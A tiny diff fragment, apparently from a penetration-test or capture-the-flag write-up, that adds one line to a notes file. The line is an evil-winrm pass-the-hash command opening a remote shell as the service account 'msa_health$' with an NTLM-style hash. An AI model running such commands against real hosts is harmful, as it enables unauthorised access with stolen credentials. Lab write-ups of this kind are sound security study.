@@ -39,3 +39,4 @@ ConnectionContext Dump: {
 ```
 
 
+evil-winrm -i  -u 'msa_health$' -H '603fc24ee01a9409f83c9d1d701485c5'
